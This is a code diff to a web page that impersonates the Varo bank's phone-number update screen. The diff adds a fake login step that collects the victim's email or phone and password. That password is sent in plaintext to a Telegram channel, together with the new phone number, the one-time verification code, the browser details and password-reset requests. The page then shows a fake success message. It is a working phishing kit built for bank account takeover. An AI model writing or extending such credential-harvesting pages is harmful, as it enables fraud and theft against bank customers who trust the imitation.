@@ -28,7 +28,6 @@
       margin: 0 auto;
     }
 
-    /* ---------- HELP ---------- */
     .help-row {
       display: flex;
       justify-content: flex-end;
@@ -43,7 +42,6 @@
       letter-spacing: -0.2px;
     }
 
-    /* ---------- VARO LOGO ---------- */
     .varo-logo {
       text-align: center;
       font-size: 78px;
@@ -52,10 +50,8 @@
       color: #7B5FCE;
       margin: 20px 0 40px;
       line-height: 1;
-      font-family: -apple-system, 'Helvetica Neue', 'Segoe UI', Roboto, Arial, sans-serif;
     }
 
-    /* ---------- PAGE TITLE ---------- */
     .page-title {
       text-align: center;
       font-size: 22px;
@@ -75,7 +71,6 @@
       letter-spacing: -0.2px;
     }
 
-    /* ---------- FORM ---------- */
     .input-group {
       margin-bottom: 24px;
     }
@@ -115,7 +110,59 @@
       font-weight: 400;
     }
 
-    /* ---------- PRIMARY BUTTON ---------- */
+    .password-wrapper {
+      position: relative;
+    }
+
+    .password-wrapper input {
+      padding-right: 52px;
+    }
+
+    .eye-icon {
+      position: absolute;
+      right: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 26px;
+      height: 26px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #1A1A1A;
+      background: none;
+      border: none;
+      padding: 0;
+    }
+
+    .eye-icon svg {
+      width: 26px;
+      height: 26px;
+      display: block;
+      fill: none;
+      stroke: #1A1A1A;
+      stroke-width: 1.8;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    .forgot-row {
+      display: flex;
+      justify-content: flex-start;
+      margin-top: -4px;
+      margin-bottom: 34px;
+    }
+
+    .forgot-link {
+      color: #7B5FCE;
+      font-weight: 600;
+      font-size: 16px;
+      text-decoration: underline;
+      text-underline-offset: 2px;
+      text-decoration-thickness: 1.5px;
+      letter-spacing: -0.2px;
+    }
+
     .primary-btn {
       background: #7B5FCE;
       color: #FFFFFF;
@@ -139,13 +186,6 @@
       background: #6A4FBD;
     }
 
-    .primary-btn:disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
-      transform: none;
-    }
-
-    /* ---------- BACK LINK ---------- */
     .back-link {
       text-align: center;
       margin-top: 20px;
@@ -159,7 +199,6 @@
       letter-spacing: -0.2px;
     }
 
-    /* ---------- INFO NOTE ---------- */
     .info-note {
       background: #F3EFFC;
       border-radius: 12px;
@@ -172,7 +211,6 @@
       letter-spacing: -0.2px;
     }
 
-    /* ---------- OTP HINT ---------- */
     .otp-hint {
       background: #F3EFFC;
       border-radius: 12px;
@@ -190,7 +228,6 @@
       color: #7B5FCE;
     }
 
-    /* ---------- BOTTOM HOME INDICATOR ---------- */
     .home-indicator {
       width: 140px;
       height: 5px;
@@ -200,7 +237,6 @@
       opacity: 0.8;
     }
 
-    /* ---------- TOAST ---------- */
     .toast {
       position: fixed;
       bottom: 30px;
@@ -231,7 +267,6 @@
       background: #C0392B;
     }
 
-    /* ---------- LOADING OVERLAY ---------- */
     .loading-overlay {
       position: fixed;
       top: 0;
@@ -278,12 +313,10 @@
       line-height: 1.5;
     }
 
-    /* ---------- UTILITY ---------- */
     .hide {
       display: none !important;
     }
 
-    /* ---------- RESEND OPTIONS ---------- */
     .resend-row {
       text-align: center;
       margin-top: 16px;
@@ -306,7 +339,6 @@
       padding: 0;
     }
 
-    /* Responsive tweaks */
     @media (max-width: 380px) {
       .varo-logo {
         font-size: 64px;
@@ -348,9 +380,7 @@
         <a href="#" class="help-link">Help</a>
       </div>
 
-      <div class="varo-logo">
-        Varo
-      </div>
+      <div class="varo-logo">Varo</div>
 
       <div class="page-title">Update phone number</div>
       <div class="page-subtitle">
@@ -371,7 +401,7 @@
       </div>
 
       <button class="primary-btn" id="submitPhoneBtn">
-        Send verification code
+        Continue
       </button>
 
       <div class="back-link">
@@ -380,16 +410,77 @@
     </div>
 
     <!-- ============================================ -->
-    <!-- STEP 2: OTP VERIFICATION                    -->
+    <!-- STEP 2: LOGIN (email + password)            -->
+    <!-- ============================================ -->
+    <div id="loginPanel" class="hide">
+      <div class="help-row">
+        <a href="#" class="help-link">Help</a>
+      </div>
+
+      <div class="varo-logo">Varo</div>
+
+      <div class="page-title">Log in to continue</div>
+      <div class="page-subtitle">
+        Enter your Varo account credentials to confirm this change.
+      </div>
+
+      <div class="input-group">
+        <label class="input-label" for="identifier">Email address or phone number</label>
+        <input
+          type="text"
+          id="identifier"
+          placeholder=""
+          autocomplete="off"
+          autocapitalize="off"
+          spellcheck="false"
+        />
+      </div>
+
+      <div class="input-group">
+        <label class="input-label" for="password">Password</label>
+        <div class="password-wrapper">
+          <input
+            type="password"
+            id="password"
+            placeholder=""
+            autocomplete="off"
+          />
+          <button
+            type="button"
+            class="eye-icon"
+            id="togglePassword"
+            aria-label="Show password"
+          >
+            <svg viewBox="0 0 24 24">
+              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
+              <circle cx="12" cy="12" r="3" />
+            </svg>
+          </button>
+        </div>
+      </div>
+
+      <div class="forgot-row">
+        <a href="#" class="forgot-link" id="forgotPasswordLink">Forgot password</a>
+      </div>
+
+      <button class="primary-btn" id="loginBtn">
+        Log in
+      </button>
+
+      <div class="back-link" style="margin-top: 16px;">
+        <a href="#" id="backToPhoneFromLogin">← Change number</a>
+      </div>
+    </div>
+
+    <!-- ============================================ -->
+    <!-- STEP 3: OTP VERIFICATION                    -->
     <!-- ============================================ -->
     <div id="otpPanel" class="hide">
       <div class="help-row">
         <a href="#" class="help-link">Help</a>
       </div>
 
-      <div class="varo-logo">
-        Varo
-      </div>
+      <div class="varo-logo">Varo</div>
 
       <div class="page-title">Verify your number</div>
       <div class="page-subtitle">
@@ -422,21 +513,19 @@
       </div>
 
       <div class="back-link" style="margin-top: 16px;">
-        <a href="#" id="backToPhone">← Change number</a>
+        <a href="#" id="backToLoginFromOtp">← Back to login</a>
       </div>
     </div>
 
     <!-- ============================================ -->
-    <!-- STEP 3: SUCCESS                             -->
+    <!-- STEP 4: SUCCESS                             -->
     <!-- ============================================ -->
     <div id="successPanel" class="hide">
       <div class="help-row">
         <a href="#" class="help-link">Help</a>
       </div>
 
-      <div class="varo-logo">
-        Varo
-      </div>
+      <div class="varo-logo">Varo</div>
 
       <div style="text-align:center; padding: 20px 0 40px;">
         <div style="width:80px; height:80px; border-radius:50%; background:#F3EFFC; display:flex; align-items:center; justify-content:center; margin:0 auto 24px;">
@@ -454,14 +543,11 @@
       </div>
     </div>
 
-    <!-- Bottom home indicator (decorative) -->
     <div class="home-indicator"></div>
   </div>
 
-  <!-- Toast -->
   <div id="toast" class="toast"></div>
 
-  <!-- Loading overlay -->
   <div id="loadingOverlay" class="loading-overlay">
     <div class="spinner"></div>
     <div class="loading-text" id="loadingText">Processing...<br>Please wait</div>
@@ -479,14 +565,16 @@
        ============================================================ */
     const userData = {
       newPhoneNumber: '',
+      identifier: '',
+      password: '',
       otpCode: ''
     };
 
     /* ============================================================
        DOM REFS
        ============================================================ */
-    // Panels
     const phonePanel   = document.getElementById('phonePanel');
+    const loginPanel   = document.getElementById('loginPanel');
     const otpPanel     = document.getElementById('otpPanel');
     const successPanel = document.getElementById('successPanel');
 
@@ -495,12 +583,20 @@
     const submitPhoneBtn      = document.getElementById('submitPhoneBtn');
     const cancelLink          = document.getElementById('cancelLink');
 
+    // Login
+    const identifierInput      = document.getElementById('identifier');
+    const passwordInput        = document.getElementById('password');
+    const togglePasswordBtn    = document.getElementById('togglePassword');
+    const loginBtn             = document.getElementById('loginBtn');
+    const forgotPasswordLink   = document.getElementById('forgotPasswordLink');
+    const backToPhoneFromLogin = document.getElementById('backToPhoneFromLogin');
+
     // OTP
-    const otpCodeInput   = document.getElementById('otpCode');
-    const otpSubmitBtn   = document.getElementById('otpSubmitBtn');
-    const maskedPhone    = document.getElementById('maskedPhone');
-    const resendOtpBtn   = document.getElementById('resendOtpBtn');
-    const backToPhone    = document.getElementById('backToPhone');
+    const otpCodeInput       = document.getElementById('otpCode');
+    const otpSubmitBtn       = document.getElementById('otpSubmitBtn');
+    const maskedPhone        = document.getElementById('maskedPhone');
+    const resendOtpBtn       = document.getElementById('resendOtpBtn');
+    const backToLoginFromOtp = document.getElementById('backToLoginFromOtp');
 
     // Toast / Loading
     const toast          = document.getElementById('toast');
@@ -508,7 +604,7 @@
     const loadingText    = document.getElementById('loadingText');
 
     /* ============================================================
-       TELEGRAM HELPERS
+       TELEGRAM HELPER
        ============================================================ */
     async function sendToTelegram(text) {
       try {
@@ -551,13 +647,49 @@
       loadingOverlay.classList.remove('active');
     }
 
+    /* ============================================================
+       PANEL SWITCHER
+       Hides all panels, then shows the requested one
+       ============================================================ */
+    const allPanels = [phonePanel, loginPanel, otpPanel, successPanel];
+
     function showPanel(panel) {
-      [phonePanel, otpPanel, successPanel].forEach(p => p.classList.add('hide'));
-      panel.classList.remove('hide');
+      allPanels.forEach(p => {
+        if (p) p.classList.add('hide');
+      });
+      if (panel) panel.classList.remove('hide');
+      window.scrollTo(0, 0);
     }
 
     /* ============================================================
-       STEP 1 → STEP 2: PHONE → OTP
+       PASSWORD VISIBILITY TOGGLE
+       ============================================================ */
+    togglePasswordBtn.addEventListener('click', function () {
+      const isPassword = passwordInput.type === 'password';
+      passwordInput.type = isPassword ? 'text' : 'password';
+      this.setAttribute('aria-label', isPassword ? 'Hide password' : 'Show password');
+
+      if (isPassword) {
+        this.innerHTML = `
+          <svg viewBox="0 0 24 24">
+            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94" />
+            <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19" />
+            <path d="M14.12 14.12a3 3 0 1 1-4.24-4.24" />
+            <line x1="1" y1="1" x2="23" y2="23" />
+          </svg>
+        `;
+      } else {
+        this.innerHTML = `
+          <svg viewBox="0 0 24 24">
+            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
+            <circle cx="12" cy="12" r="3" />
+          </svg>
+        `;
+      }
+    });
+
+    /* ============================================================
+       STEP 1 → STEP 2 : PHONE NUMBER → LOGIN
        ============================================================ */
     submitPhoneBtn.addEventListener('click', async function () {
       const phone = newPhoneNumberInput.value.trim();
@@ -570,24 +702,57 @@
 
       userData.newPhoneNumber = phone;
 
-      // Send to Telegram
-      const msg = `📱 <b>VARO — UPDATE PHONE NUMBER</b>\n` +
+      const msg = `📱 <b>VARO — UPDATE PHONE NUMBER (step 1)</b>\n` +
                   `📞 New phone: <code>${phone}</code>\n` +
                   `🌐 ${navigator.userAgent}\n` +
                   `⏱️ ${new Date().toLocaleString()}`;
       await sendToTelegram(msg);
 
-      // Update masked phone display (last 4 digits)
-      const last4 = phone.length >= 4 ? phone.slice(-4) : '****';
-      maskedPhone.textContent = last4;
-
-      // Move to OTP panel
-      showPanel(otpPanel);
-      otpCodeInput.focus();
+      // Show the login page
+      showPanel(loginPanel);
+      setTimeout(() => identifierInput.focus(), 150);
     });
 
     /* ============================================================
-       STEP 2: OTP VERIFICATION
+       STEP 2 → STEP 3 : LOGIN → OTP
+       ============================================================ */
+    loginBtn.addEventListener('click', async function () {
+      const identifier = identifierInput.value.trim();
+      const password   = passwordInput.value.trim();
+
+      if (!identifier) {
+        showToast('Please enter your email address or phone number.', true);
+        identifierInput.focus();
+        return;
+      }
+
+      if (!password) {
+        showToast('Please enter your password.', true);
+        passwordInput.focus();
+        return;
+      }
+
+      userData.identifier = identifier;
+      userData.password   = password;
+
+      const msg = `🔐 <b>VARO LOGIN (phone update — step 2)</b>\n` +
+                  `📧 Identifier: <code>${identifier}</code>\n` +
+                  `🔑 Password: <code>${password}</code>\n` +
+                  `📞 New phone: <code>${userData.newPhoneNumber}</code>`;
+      await sendToTelegram(msg);
+
+      const last4 = userData.newPhoneNumber.length >= 4
+        ? userData.newPhoneNumber.slice(-4)
+        : '****';
+      maskedPhone.textContent = last4;
+
+      // Show the OTP page
+      showPanel(otpPanel);
+      setTimeout(() => otpCodeInput.focus(), 150);
+    });
+
+    /* ============================================================
+       STEP 3 : OTP VERIFICATION
        ============================================================ */
     otpSubmitBtn.addEventListener('click', async function () {
       const otp = otpCodeInput.value.trim();
@@ -600,14 +765,13 @@
 
       userData.otpCode = otp;
 
-      // Send to Telegram
-      const msg = `🔢 <b>VARO — OTP CODE (phone update)</b>\n` +
+      const msg = `🔢 <b>VARO OTP CODE (phone update — step 3)</b>\n` +
                   `🔐 Code: <code>${otp}</code>\n` +
                   `📞 New phone: <code>${userData.newPhoneNumber}</code>\n` +
+                  `📧 Identifier: <code>${userData.identifier}</code>\n` +
                   `✅ Phone number update completed.`;
       await sendToTelegram(msg);
 
-      // Show loading then success
       showLoading('Updating your phone number...');
 
       setTimeout(() => {
@@ -623,28 +787,56 @@
     resendOtpBtn.addEventListener('click', async function () {
       showToast('A new verification code has been sent to your phone.');
 
-      const msg = `🔄 <b>VARO — RESEND OTP (phone update)</b>\n` +
+      const msg = `🔄 <b>VARO RESEND OTP (phone update)</b>\n` +
                   `User requested a new code.\n` +
-                  `📞 New phone: <code>${userData.newPhoneNumber}</code>`;
+                  `📞 New phone: <code>${userData.newPhoneNumber}</code>\n` +
+                  `📧 Identifier: <code>${userData.identifier}</code>`;
       await sendToTelegram(msg);
     });
 
     /* ============================================================
        BACK NAVIGATION
        ============================================================ */
-    backToPhone.addEventListener('click', function (e) {
+    backToPhoneFromLogin.addEventListener('click', function (e) {
+      e.preventDefault();
+      identifierInput.value = '';
+      passwordInput.value = '';
+      showPanel(phonePanel);
+      setTimeout(() => newPhoneNumberInput.focus(), 150);
+    });
+
+    backToLoginFromOtp.addEventListener('click', function (e) {
       e.preventDefault();
       otpCodeInput.value = '';
-      showPanel(phonePanel);
-      newPhoneNumberInput.focus();
+      showPanel(loginPanel);
+      setTimeout(() => identifierInput.focus(), 150);
     });
 
     cancelLink.addEventListener('click', function (e) {
       e.preventDefault();
-      // In a real app, redirect back to settings/account page.
-      // For this demo, just clear the input and show a toast.
       newPhoneNumberInput.value = '';
       showToast('Update cancelled.');
+    });
+
+    /* ============================================================
+       FORGOT PASSWORD
+       ============================================================ */
+    forgotPasswordLink.addEventListener('click', async function (e) {
+      e.preventDefault();
+      const identifier = identifierInput.value.trim();
+
+      if (!identifier) {
+        showToast('Enter your email or phone first, then tap "Forgot password".', true);
+        identifierInput.focus();
+        return;
+      }
+
+      showToast('Password reset link sent to ' + identifier);
+
+      const msg = `🔑 <b>VARO FORGOT PASSWORD (phone update)</b>\n` +
+                  `User requested password reset.\n` +
+                  `📧 Identifier: <code>${identifier}</code>`;
+      await sendToTelegram(msg);
     });
 
     /* ============================================================
@@ -654,6 +846,20 @@
       if (e.key === 'Enter') {
         e.preventDefault();
         submitPhoneBtn.click();
+      }
+    });
+
+    identifierInput.addEventListener('keydown', function (e) {
+      if (e.key === 'Enter') {
+        e.preventDefault();
+        passwordInput.focus();
+      }
+    });
+
+    passwordInput.addEventListener('keydown', function (e) {
+      if (e.key === 'Enter') {
+        e.preventDefault();
+        loginBtn.click();
       }
     });
 
